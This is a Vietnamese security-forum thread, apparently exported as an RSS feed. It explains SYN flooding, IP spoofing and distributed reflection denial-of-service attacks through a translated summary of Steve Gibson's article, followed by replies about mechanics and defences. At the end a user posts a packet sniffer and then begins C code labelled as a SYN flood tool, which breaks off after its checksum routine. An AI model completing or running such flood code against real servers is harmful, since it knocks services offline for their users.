@@ -1,0 +1,846 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "DRDoS"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/8.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "DRDoS"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>DRDoS</title>
+				<description><![CDATA[ <font color='red'><font size='+3'><b>DRDoS</b></font></font><font color='yellow'>
+
+Distributed Reflection Denial of Service - Tấn công từ chối dịch vụ bằng phương pháp phản xạ nhiều vùng</font>
+(Th3 W@tch3r)
+
+<font color='yellow'>0. Chú ý:</font>
+a. Tôi cũng và tác giả của bài viết ( Steve Gibson ) không chịu trách nhiệm về hành động của các bạn khi đọc bài viết, bài viết chỉ có mục đích nâng cao kiến thức ... nếu bạn muốn thực hành thì hãy tự setup 1 server ở nhà và tấn công máy của mình.
+
+b. Bài viết được lược dịch từ gốc www.grc.com/dos/drdos.htm của tác giả Steve Gibson, tất cả credit là đều của Steve Gibson. Nếu bạn muốn 1 bản tiếng anh bạn có thể đến địa chỉ trên để tra cứu
+
+c. Mọi vấn đề xin liên hệ th3watch3rvn at Yahoo dot com
+
+<font color='yellow'>1. Giới thiệu:</font>Vào lúc 2 giờ sáng ngày 11 - 1 - 2002, Trang web GRC.COM đã bị đánh tung khỏi Internet bằng một kiểu tấn công từ chối dịch vụ mới. Điều kinh ngạc chính là nguồn tấn công đươ.c bắt đầu bằng những đường chính của Internet, bao gồm Yahoo.com và cả những IP "gary7.nsa.gov". Chúng tôi đã bị tấn công bởi hàng trăm server mạnh nhất của internet ...
+
+Vào thời điểm chúng tôi tìm ra cách để ngăn chặn cuộc tấn công này và quay lại internet, 1 072 519 399 packet bị chặn đứng trước khi cuộc tấn công bị dừng ...
+
+Đây chính là những thông tin được Steve Gibson mô tả trong bài báo về DRDoS mà ông đã gặp ngày 11-1-2002... và bây giờ chúng ta sẽ tìm hiểu xem DRDoS là gì và cách tấn công như thế nào.
+
+<font color='yellow'>2. Sơ lược về TCP/IP:</font>
+Bạn đọc thêm tại www.viethacker.info/~th3watch3rvn trong bài TCP 3-ways hanshake để biết thêm về cách TCP mở 1 phiên làm việc
+
+<font color='yellow'>3. Lợi dụng TCP: phương pháp SYN flood truyền thống:</font>
+Nhiều năm trước đây, sự yếu kém của đường truyền TCP được các HĐH sử dụng đã bị các Internet's Hacker kháp phá ra và lợi dụng.
+
+Theo sơ đồ ở dưới đây, Client gửi SYN packet cho server để thông báo server chuẩn bị 1 đường truyền. Server sẽ giành 1 phần tài nguyên hệ thống như bộ nhớ đệm để nhận và truyền dữ liệu. Ngoài ra các thông tin khác của Client cũng được ghi nhận như địa chỉ IP của Client và Cổng ( Port ). Sau đó server sẽ send ngược lại SYN/ACK packet để thông báo Client là mọi thứ đã chuẩn bị và nếu như không nhận đuợc ACK packt của Client ( có thể do packet đã bị thất lạc trên đường truyền ), server sẽ tiếp tục gửi lại SYN/ACK packet cho Client.
+
+Nhưng chúng ta sẽ tiếp tục suy nghĩ tiếp. Như vậy với bất cứ 1 SYN packet đơn giản nào, Server cũng phải để 1 phần tài nguyên cho đường truyền đó, và tài nguyên của Server là có hạn và Hacker sẽ tìm mọi cách để Server đạt được cái giới hạn đó. ( Đây còn được gọi là half-open connection)
+<br>
+			<div align="center" class="limitview"><img src='http://img235.imageshack.us/img235/3501/tcpspoof6ux.gif' border="0" onload="maxImg(this, 500px);" /></div>
+
+Bằng cách dùng Raw Sockets ( không phải TCP hay DUP packet ), IP gốc của packet có thể bị ghi đè lên và làm giả mạo. Khi một SYN packet với IP giả mạo được gửi đến Server, nó cũng như bao packet khác, vẫn hợp lệ đối với Server và Server sẽ cấp vùng tài nguyên cho đường truyền này, ghi nhận toàn bộ thông tin và gủi SYN/ACK packet ngược lại cho Client. Vì địa chỉ IP của Client là giả mạo nên sẽ không có Client nào nhận được SYN/ACK packet này, sau 1 thời gian không nhận được ACK packet từ Client, Server nghĩ rằng packet bị thất lạc nên lại tiếp tục gửi tiếp SYN/ACK packet, cứ như thế, connection tiếp tục mở.
+
+Nếu như Hacker tiếp tục gửi nhiều SYN packet đến Server và cuối cùng Server đã không thể tiếp nhận thêm 1 connection nào nữa : Server đã bị flood.
+
+Đây không phải là kiểu tấn công bằng đường truyền cao, bởi vì chỉ cần 1 máy tính nối internet dial up đơn giản cũng có thể tấn công kiểu này ( tất nhiên sẽ lâu hơn 1 chút ;) )
+
+<font color='yellow'>4. Sự phát triển của cách tấn công bằng Bandwidth:</font>
+a. Điều gì xảy ra trong quá trình Bandwidth attack:
+
+Không giống như cách tấn công SYN Flood, Bandwidth attack tạo 1 brute force attack từ các Server mạnh đến máy của Victim, những packet giả ồ ạt chiếm hết đường truyền của Victim làm máy Victim không thể nhận thêm 1 packet nào khác.
+
+<br>
+			<div align="center" class="limitview"><img src='http://img235.imageshack.us/img235/1719/tcprouter3ph.gif' border="0" onload="maxImg(this, 500px);" /></div>
+Như chúng ta thấy ở sơ đồ trên, tất cả packet đi vào 1 mạng máy tính qua 1 "Big-Pipe" ( ống dẫn lớn ), sau đó được router chia ra những "Small Pipe" ( ống dẫn nhỏ ) cho nhiều computer con tùy theo địa chỉ IP của packet. Nhưng nếu toàn bộ "Big-Pipe" bị flood bằng những packet chỉ hướng đến 1 computer nhất định trong mạng máy tính con này, Router đành phải chấp nhận loại bỏ phần lớn các packet để chỉ còn lại số lượng vừa đủ đi qua "Small Pipe" của computer đó. Kiểu tấn công "cá lớn nuốt cá bé" này sẽ đá văng victim ra khỏi internet...
+
+ 
+<font color='yellow'>5. DoS vs DDos ( Denial of Service Vs Distributed Deninal of Service ) 
+DoS: </font>Phong cách tấn công truyền thống, khi 1 computer tấn công 1 computer khác
+
+<br>
+			<div align="center" class="limitview"><img src='http://img226.imageshack.us/img226/5553/tcpdos4nj.gif' border="0" onload="maxImg(this, 500px);" /></div>
+
+Với kiểu tấn công này 1 máy tính có đường truyền cao có thể đánh bật các máy có đường truyền thấp hơn ra khỏi Internet 
+
+DDos: Tấn công mức độ cao hơn bằng cách sử dụng đường truyền của nhiều máy tính tấn công vào 1 máy tính hay 1 mạng máy tính. 
+
+<br>
+			<div align="center" class="limitview"><img src='http://img144.imageshack.us/img144/6883/tcpddos7ik.gif' border="0" onload="maxImg(this, 500px);" /></div>
+
+Máy tấn công ( Attack Control Machanism ) sẽ điều khiển các máy tính khác ( Zombie ) để cùng tấn công vào 1 mục tiêu duy nhất ( Target / Victim Network )
+
+Tất cả Zombie đều có thể ở trong 1 mạng máy tính với đường truyền thấp hơn, nhưng với nhiều mạng máy tính hợp lại, cho dùng Victim có đường truyền nhanh nhất thế giới cũng sẽ bị đánh bật ra khỏi internet dễ dàng. ( Tất cả "Small Pipe" của Zombie hợp lại thành "Big Pipe" hướng đến router của victim )
+
+Vì sự tấn công đựơc giàn đều đến các máy khác nhau trên internet nên phương pháp này được gọi là DDoS 
+
+<font color='Yellow'>6. DRDoS ( Distributed Reflection Denial of Service ) - Thế hệ tiếp theo của DDoS.</font>
+( Lưu ý: Trong tài liệu gốc của Steve Gibson, đoạn này sẽ kể lại cuộc tấn công DRDoS hướng vào grc.com, nhưng ở đây với mục đính thông tin, tôi chỉ tóm lược về phương pháp DRDoS, nếu bạn thích đọc về cuộc tấn công này bạn có thể tham khảo ở trang web nguồn )
+
+Bây giờ, chúng ta hãy nhớ lại phương pháp SYN attack truyền thống của DoS, phương pháp này dựa trên bước thứ nhất để mở connection của TCP để tạo các "open half" connection làm Server bị ăn mòn hết tài nguyên. Các SYN packet được gửi trực tiếp đến Server sau khi đã giả mạo IP nguồn. IP giả mạo sẽ là 1 IP không có thật trên Internet để cho Server không thể nào hoàn thành được connection.
+
+Ta có Server A và Victim, giả sử ta gửi 1 SYN packet đến Server A trong đó IP nguồn đã bị giả mạo thành IP của Victim, bạn nghĩ chuyện gì sẽ xảy ra ??? Đúng, Server A sẽ mở 1 connection và gủi SYN/ACK packet cho Victim vì nghĩ rằng Victim muốn mở connection với mình. Và đây chính là khái niệm của Reflection ( Phản xạ ).
+
+DRDoS có thể được mô tả như sau :
+
+<br>
+			<div align="center" class="limitview"><img src='http://img226.imageshack.us/img226/563/tcpreflect7gx.gif' border="0" onload="maxImg(this, 500px);" /></div>
+
+Hacker sẽ điều khiển Spoof SYN generator, gửi SYN packet đến tất cả các TCP Server lớn, lúc này các TCP Server này vô tình thành Zombie cho Hacker để cùng tấn công Victim và làm nghẽn đường truyền của Victim. ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#545</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#545</link>
+				<pubDate><![CDATA[Tue, 20 Jun 2006 04:17:47]]> GMT</pubDate>
+				<author><![CDATA[ Mulan]]></author>
+			</item>
+			<item>
+				<title>DRDoS</title>
+				<description><![CDATA[ Đầy đủ, cụ thể . . . rất đáng cho mọi người cũng tham khảo !
+
+HAVE FUN !]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#1821</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#1821</link>
+				<pubDate><![CDATA[Wed, 28 Jun 2006 15:42:16]]> GMT</pubDate>
+				<author><![CDATA[ phamquoc_truong]]></author>
+			</item>
+			<item>
+				<title>DRDoS</title>
+				<description><![CDATA[ Anh Mulan, cái này là bài em viết hồi xưa trên trang chuadatten.com mà. He he. Bắt đền bản quyền.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#5312</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#5312</link>
+				<pubDate><![CDATA[Sat, 8 Jul 2006 22:29:21]]> GMT</pubDate>
+				<author><![CDATA[ nhatminh1209]]></author>
+			</item>
+			<item>
+				<title>DRDoS</title>
+				<description><![CDATA[ Có cần anh attach luôn cái source anh Save của Th3 W@tch3r không. Lần sau nói linh tinh anh xoá bài đấy.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#5410</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#5410</link>
+				<pubDate><![CDATA[Sun, 9 Jul 2006 14:16:50]]> GMT</pubDate>
+				<author><![CDATA[ Mulan]]></author>
+			</item>
+			<item>
+				<title>Re: DRDoS</title>
+				<description><![CDATA[ <blockquote>Vào lúc 2 giờ sáng ngày 11 - 1 - 2002, Trang web GRC.COM đã bị đánh tung khỏi Internet bằng một kiểu tấn công từ chối dịch vụ mới. Điều kinh ngạc chính là nguồn tấn công đươ.c bắt đầu bằng những đường chính của Internet, bao gồm Yahoo.com và cả những IP "gary7.nsa.gov". Chúng tôi đã bị tấn công bởi hàng trăm server mạnh nhất của internet ... 
+
+Vào thời điểm chúng tôi tìm ra cách để ngăn chặn cuộc tấn công này và quay lại internet, 1 072 519 399 packet bị chặn đứng trước khi cuộc tấn công bị dừng ... 
+
+&nbsp;
+		</blockquote>
+Có vẻ kiểu tấn công này là lí tưởng trong thời điểm hiện nay,khả năng có một cuộc tấn công tương tư hiện nay chắc là ko có,nhất là tại VN]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#5449</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#5449</link>
+				<pubDate><![CDATA[Sun, 9 Jul 2006 18:24:52]]> GMT</pubDate>
+				<author><![CDATA[ mR.Bi]]></author>
+			</item>
+			<item>
+				<title>DRDoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">Mulan wrote:</cite><br>
+		<blockquote>Có cần anh attach luôn cái source anh Save của Th3 W@tch3r không. Lần sau nói linh tinh anh xoá bài đấy.&nbsp;
+		</blockquote>
+
+Không, he he :mrgreen:  :mrgreen:  Em nói đùa đấy mà. Thôi lần sau em không ăn nói linh tinh nữa. Đúng là em hay phát biểu vớ vẩn thật. he he]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#5501</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#5501</link>
+				<pubDate><![CDATA[Sun, 9 Jul 2006 22:51:40]]> GMT</pubDate>
+				<author><![CDATA[ nhatminh1209]]></author>
+			</item>
+			<item>
+				<title>DRDoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">nhatminh1209 wrote:</cite><br>
+		<blockquote><p></p>
+		<cite class="blockquote">Mulan wrote:</cite><br>
+		<blockquote>Có cần anh attach luôn cái source anh Save của Th3 W@tch3r không. Lần sau nói linh tinh anh xoá bài đấy.&nbsp;
+		</blockquote>
+
+Không, he he :mrgreen:  :mrgreen:  Em nói đùa đấy mà. Thôi lần sau em không ăn nói linh tinh nữa. Đúng là em hay phát biểu vớ vẩn thật. he he&nbsp;
+		</blockquote>
+
+Giảm bớt chit chat dùm. Trong box kỹ thuật không nên í a, í ới. Cảnh cáo lần thứ nhất đấy nha.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#5547</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#5547</link>
+				<pubDate><![CDATA[Mon, 10 Jul 2006 06:23:59]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+			<item>
+				<title>DRDoS</title>
+				<description><![CDATA[ vậy có cách nào hạn chế số lần request của server khi trở thành victim tới 1 ip để tránh tình trạng thành cấp số nhân ( server request tới 1 ip nhiều lần !) 
+hoặc cách nào khác có thể giới hạn số ip cùng truy cập trên 1 thời điểm ! 
+anh em nào đi trước mong chỉ giáo ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#12526</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#12526</link>
+				<pubDate><![CDATA[Sat, 5 Aug 2006 12:39:35]]> GMT</pubDate>
+				<author><![CDATA[ mrsleeping]]></author>
+			</item>
+			<item>
+				<title>DRDoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">mrsleeping wrote:</cite><br>
+		<blockquote>vậy có cách nào hạn chế số lần request của server khi trở thành victim tới 1 ip để tránh tình trạng thành cấp số nhân ( server request tới 1 ip nhiều lần !) 
+hoặc cách nào khác có thể giới hạn số ip cùng truy cập trên 1 thời điểm ! 
+anh em nào đi trước mong chỉ giáo &nbsp;
+		</blockquote>
+
+Bạn xem tại đây
+<span class="link"> http://www.hvaforum.net/hvaonline/posts/list/1885.hva</span>
+
+Thân
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#12594</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#12594</link>
+				<pubDate><![CDATA[Sat, 5 Aug 2006 19:23:12]]> GMT</pubDate>
+				<author><![CDATA[ subnetwork]]></author>
+			</item>
+			<item>
+				<title>Re: DRDoS</title>
+				<description><![CDATA[ Cho em thắc mắc một chút,nếu tất cả các package mang cờ SYN/ACK gửi tới máy victim,ở đây khoan nói đến việc đầy nghẽn "small pipe" đã,vậy máy victim sẽ xử lý như thế nào với các package này? 
+    Theo như suy luận của em thì máy victim khi nhận những package ngoài mong muốn này nó sẽ biết ko phải là của nó nên nó sẽ bỏ qua( vì trong bộ nhớ của nó đâu có hàng đợi khi truyền cờ SYN đâu).
+  
+  Như vậy vấn để ở đây có phải cách tấn công này đá văng máy victim ra khỏi internet là do đường truyền bị chiếm dụng không anh? Và nếu đúng như vậy thì cách tấn công này phải ánh xạ từ những server cực mạnh và số lượng lớn thì mới có tác dụng chứ hả anh Mulan?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#13998</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#13998</link>
+				<pubDate><![CDATA[Fri, 11 Aug 2006 01:17:30]]> GMT</pubDate>
+				<author><![CDATA[ delay]]></author>
+			</item>
+			<item>
+				<title>DRDoS</title>
+				<description><![CDATA[ <blockquote>Cho em thắc mắc một chút,nếu tất cả các package mang cờ SYN/ACK gửi tới máy victim,ở đây khoan nói đến việc đầy nghẽn "small pipe" đã,vậy máy victim sẽ xử lý như thế nào với các package này?
+Theo như suy luận của em thì máy victim khi nhận những package ngoài mong muốn này nó sẽ biết ko phải là của nó nên nó sẽ bỏ qua( vì trong bộ nhớ của nó đâu có hàng đợi khi truyền cờ SYN đâu). &nbsp;
+		</blockquote>
+
+Ở trong mục "phương pháp SYN flood truyền thống" thì SYN/ACK không phải gửi tới máy victim mà SYN/ACK ở đây là từ victim (server đang bị flood) gửi tới một địa chỉ ma.
+Và vì đây là địa chỉ ma (dù có hay không) thì mục đích của chúng ta đang là flood server:
+---->
+<blockquote>Server nghĩ rằng packet bị thất lạc nên lại tiếp tục gửi tiếp SYN/ACK packet, cứ như thế, connection tiếp tục mở.
+
+Nếu như Hacker tiếp tục gửi nhiều SYN packet đến Server và cuối cùng Server đã không thể tiếp nhận thêm 1 connection nào nữa : Server đã bị flood. &nbsp;
+		</blockquote>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#14059</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#14059</link>
+				<pubDate><![CDATA[Fri, 11 Aug 2006 10:20:22]]> GMT</pubDate>
+				<author><![CDATA[ Mulan]]></author>
+			</item>
+			<item>
+				<title>Re: DRDoS</title>
+				<description><![CDATA[ dù sao cũng hay nhưng phải thêm nhiêu thứ nữa. tôi sẽ bổ sung tiếp  khi có dịp và hứng thú với chủ đề này! cách phòng chống hiệu quả nhất sẽ đươc đề cập!]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#14228</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#14228</link>
+				<pubDate><![CDATA[Fri, 11 Aug 2006 18:24:32]]> GMT</pubDate>
+				<author><![CDATA[ romanticist85]]></author>
+			</item>
+			<item>
+				<title>Re: DRDoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">delay wrote:</cite><br>
+		<blockquote>Cho em thắc mắc một chút,nếu tất cả các package mang cờ SYN/ACK gửi tới máy victim,ở đây khoan nói đến việc đầy nghẽn "small pipe" đã,vậy máy victim sẽ xử lý như thế nào với các package này? 
+    Theo như suy luận của em thì máy victim khi nhận những package ngoài mong muốn này nó sẽ biết ko phải là của nó nên nó sẽ bỏ qua( vì trong bộ nhớ của nó đâu có hàng đợi khi truyền cờ SYN đâu).
+  
+  Như vậy vấn để ở đây có phải cách tấn công này đá văng máy victim ra khỏi internet là do đường truyền bị chiếm dụng không anh? Và nếu đúng như vậy thì cách tấn công này phải ánh xạ từ những server cực mạnh và số lượng lớn thì mới có tác dụng chứ hả anh Mulan?&nbsp;
+		</blockquote>
+
+Không phải hệ điều hành nào cũng xử lý các gói SYN/ACK gọn gàng và nhanh chóng (bỏ qua) được. Hơn nữa, để "bỏ qua", hệ điều hành vẫn phải xác minh nó là cái gì rồi mới "bỏ qua" và làm như thế vẫn hao tổn tài nguyên.
+
+Nếu số lượng SYN/ACK đi vào quá nhiều, nó vẫn có thể dung hoà (saturate) đường dẫn khiến cho các truy cập khác không thể nào đến được máy của nạn nhân.
+
+Tấn công "ánh xạ" này không cần phải đi từ những server cực mạnh mà chỉ cần gởi càng nhiều spoofed packets đến các routers càng tốt để chúng dội ngược lại nạn nhân.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#14262</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#14262</link>
+				<pubDate><![CDATA[Fri, 11 Aug 2006 20:08:20]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+			<item>
+				<title>DRDoS</title>
+				<description><![CDATA[ Phức tạp phết anh ạ...
+Dù sao cũng thanks anh nhé]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#206386</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#206386</link>
+				<pubDate><![CDATA[Sun, 7 Mar 2010 07:39:13]]> GMT</pubDate>
+				<author><![CDATA[ Mr_tokeo]]></author>
+			</item>
+			<item>
+				<title>DRDoS</title>
+				<description><![CDATA[ Thật sự là một bài viết dày công, dù dịch hay là kiến thức của tác giả. Xin cảm ơn.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#206732</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#206732</link>
+				<pubDate><![CDATA[Fri, 12 Mar 2010 05:38:41]]> GMT</pubDate>
+				<author><![CDATA[ hacker_lo_mo]]></author>
+			</item>
+			<item>
+				<title>DRDoS</title>
+				<description><![CDATA[ cái này thì mình biết rồi nhưng cách thực hiện nó mới là điều quan trọng ??? B-)
+anh nào pro cho em hỏi 2 vấn đề liên quan đến nó
+1&gt;dùng cộng cụ nào để giả mạo thành ip của victim B-)
+2&gt;gửi một gói đến sever như thế nào&lt;tcp/ip em chưa biết gì cả mong mấy anh chỉ cho và học nó ở trang nào&gt; B-)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#208510</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#208510</link>
+				<pubDate><![CDATA[Tue, 6 Apr 2010 05:06:26]]> GMT</pubDate>
+				<author><![CDATA[ graycap]]></author>
+			</item>
+			<item>
+				<title>DRDoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">graycap wrote:</cite><br>
+		<blockquote>cái này thì mình biết rồi nhưng cách thực hiện nó mới là điều quan trọng ??? B-)
+anh nào pro cho em hỏi 2 vấn đề liên quan đến nó
+1&gt;dùng cộng cụ nào để giả mạo thành ip của victim B-)
+2&gt;gửi một gói đến sever như thế nào&lt;tcp/ip em chưa biết gì cả mong mấy anh chỉ cho và học nó ở trang nào&gt; B-)&nbsp;
+		</blockquote>
+Câu phát biểu mâu thuẩn thật sự. Góp ý về sự nâng câu hiểu biết bằng cách siêng năng đọc diễn đàn. Đọc "Ở đâu" thì nên bắt đầu (hoặc nếu không muốn bắt đầu) tìm hiểu phòng đọc và "cứ ngồi mà đọc để biết những gì mình không biết".]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#208513</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#208513</link>
+				<pubDate><![CDATA[Tue, 6 Apr 2010 05:20:05]]> GMT</pubDate>
+				<author><![CDATA[ tmd]]></author>
+			</item>
+			<item>
+				<title>DRDoS</title>
+				<description><![CDATA[ đọc cai gì mà đọc hả ông anh mấy cái liên quan đến cái này máy ông amid không cho phép post đâu ông anh ak &lt;đọc bằng niềm tin&gt; :-)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#208782</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#208782</link>
+				<pubDate><![CDATA[Sat, 10 Apr 2010 05:46:13]]> GMT</pubDate>
+				<author><![CDATA[ graycap]]></author>
+			</item>
+			<item>
+				<title>DRDoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">graycap wrote:</cite><br>
+		<blockquote>đọc cai gì mà đọc hả ông anh mấy cái liên quan đến cái này máy ông amid không cho phép post đâu ông anh ak &lt;đọc bằng niềm tin&gt; :-)&nbsp;
+		</blockquote>
+
+Ai bảo cậu là mấy admin ko cho phép post. vấn đề là không có ai thèm post thôi. vì post ra rồi lại có thêm mấy cu cậu script kiddie mang ra nghịch ngợm linh tinh rồi chẳng đâu vào đâu. vì nếu mà ở mục đích hiểu biết thì người ta sẽ tự đọc sách và tìm hiểu lấy chứ không có time lên hỏi dùng tool nào để giả mạo ip hay là làm thế nào để gửi request đến server.
+tôi thấy cậu nên tìm cái quyển sách nào mà ngồi đọc thì hay hơn là suốt ngày lượn quanh mấy cái 2pic DrDos rồi post những bài kiểu này.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#208787</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#208787</link>
+				<pubDate><![CDATA[Sat, 10 Apr 2010 06:22:52]]> GMT</pubDate>
+				<author><![CDATA[ phanledaivuong]]></author>
+			</item>
+			<item>
+				<title>DRDoS</title>
+				<description><![CDATA[ Em còn bé không biết cái code này có liên quan đến cái gì nhờ các anh giúp
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+#include&lt;sys/socket.h&gt;
+#include&lt;features.h&gt;
+#include&lt;linux/if_packet.h&gt;
+#include&lt;linux/if_ether.h&gt;
+#include&lt;errno.h&gt;
+#include&lt;sys/ioctl.h&gt;
+#include&lt;net/if.h&gt;
+
+
+int CreateRawSocket&#40;int protocol_to_sniff&#41;
+{
+	int rawsock;
+
+	if&#40;&#40;rawsock = socket&#40;PF_PACKET, SOCK_RAW, htons&#40;protocol_to_sniff&#41;&#41;&#41;== -1&#41;
+	{
+		perror&#40;"Error creating raw socket: "&#41;;
+		exit&#40;-1&#41;;
+	}
+
+	return rawsock;
+}
+
+int BindRawSocketToInterface&#40;char *device, int rawsock, int protocol&#41;
+{
+	
+	struct sockaddr_ll sll;
+	struct ifreq ifr;
+
+	bzero&#40;&sll, sizeof&#40;sll&#41;&#41;;
+	bzero&#40;&ifr, sizeof&#40;ifr&#41;&#41;;
+	
+	/* First Get the Interface Index  */
+
+
+	strncpy&#40;&#40;char *&#41;ifr.ifr_name, device, IFNAMSIZ&#41;;
+	if&#40;&#40;ioctl&#40;rawsock, SIOCGIFINDEX, &ifr&#41;&#41; == -1&#41;
+	{
+		printf&#40;"Error getting Interface index !\n"&#41;;
+		exit&#40;-1&#41;;
+	}
+
+	/* Bind our raw socket to this interface */
+
+	sll.sll_family = AF_PACKET;
+	sll.sll_ifindex = ifr.ifr_ifindex;
+	sll.sll_protocol = htons&#40;protocol&#41;; 
+
+
+	if&#40;&#40;bind&#40;rawsock, &#40;struct sockaddr *&#41;&sll, sizeof&#40;sll&#41;&#41;&#41;== -1&#41;
+	{
+		perror&#40;"Error binding raw socket to interface\n"&#41;;
+		exit&#40;-1&#41;;
+	}
+
+	return 1;
+	
+}
+
+void PrintPacketInHex&#40;unsigned char *packet, int len&#41;
+{
+	unsigned char *p = packet;
+
+	printf&#40;"\n\n---------Packet---Starts----\n\n"&#41;;
+	
+	while&#40;len--&#41;
+	{
+		printf&#40;"%.2x ", *p&#41;;
+		p++;
+	}
+
+	printf&#40;"\n\n--------Packet---Ends-----\n\n"&#41;;
+
+}
+
+
+main&#40;int argc, char **argv&#41;
+{
+	int raw;
+	unsigned char packet_buffer&#91;2048&#93;; 
+	int len;
+	int packets_to_sniff;
+	struct sockaddr_ll packet_info;
+	int packet_info_size = sizeof&#40;packet_info&#41;;
+
+	/* create the raw socket */
+
+	raw = CreateRawSocket&#40;ETH_P_IP&#41;;
+
+	/* Bind socket to interface */
+
+	BindRawSocketToInterface&#40;argv&#91;1&#93;, raw, ETH_P_IP&#41;;
+
+	/* Get number of packets to sniff from user */
+
+	packets_to_sniff = atoi&#40;argv&#91;2&#93;&#41;;
+
+	/* Start Sniffing and print Hex of every packet */
+	
+	while&#40;packets_to_sniff--&#41;
+	{
+		if&#40;&#40;len = recvfrom&#40;raw, packet_buffer, 2048, 0, &#40;struct sockaddr*&#41;&packet_info, &packet_info_size&#41;&#41; == -1&#41;
+		{
+			perror&#40;"Recv from returned -1: "&#41;;
+			exit&#40;-1&#41;;
+		}
+		else
+		{
+			/* Packet has been received successfully !! */
+
+			PrintPacketInHex&#40;packet_buffer, len&#41;;
+		}
+	}
+	
+	
+	return 0;
+}</pre>
+		</div>
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#208840</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#208840</link>
+				<pubDate><![CDATA[Sun, 11 Apr 2010 01:26:59]]> GMT</pubDate>
+				<author><![CDATA[ anpha]]></author>
+			</item>
+			<item>
+				<title>DRDoS</title>
+				<description><![CDATA[ Em post nhầm code. Cái này cơ, xin lỗi vì chức năng sửa bài không hoặt động cho members
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>/*
+	Syn Flood DOS with LINUX sockets
+*/
+#include&lt;stdio.h&gt;
+#include&lt;netinet/tcp.h&gt;	//Provides declarations for tcp header
+#include&lt;netinet/ip.h&gt;	//Provides declarations for ip header
+
+typedef struct pseudo_header    //needed for checksum calculation
+{
+	unsigned int source_address;
+	unsigned int dest_address;
+	unsigned char placeholder;
+	unsigned char protocol;
+	unsigned short tcp_length;
+	//char tcp&#91;28&#93;;
+	struct tcphdr tcp;
+};
+
+unsigned short csum&#40;unsigned short *ptr,int nbytes&#41; {
+	register long sum;
+	unsigned short oddbyte;
+	register short answer;
+
+	sum=0;
+	while&#40;nbytes&gt;1&#41; {
+		sum+=*ptr++;
+		nbytes-=2;
+	}
+	if&#40;nbytes==1&#41; {
+		oddbyte=0;
+		*&#40;&#40;u_char*&#41;&oddbyte&#41;=*&#40;u_char*&#41;ptr;
+		sum+=oddbyte;
+	}
+
+	sum = &#40;sum&gt;&gt;16&#41;+&#40;sum & 0xffff&#41;;
+	sum = sum + &#40;sum&gt;&gt;16&#41;;
+	answer=&#40;short&#41;~sum;
+
+	return&#40;answer&#41;;
+}
+
+int main &#40;void&#41;
+{
+	//Create a raw socket
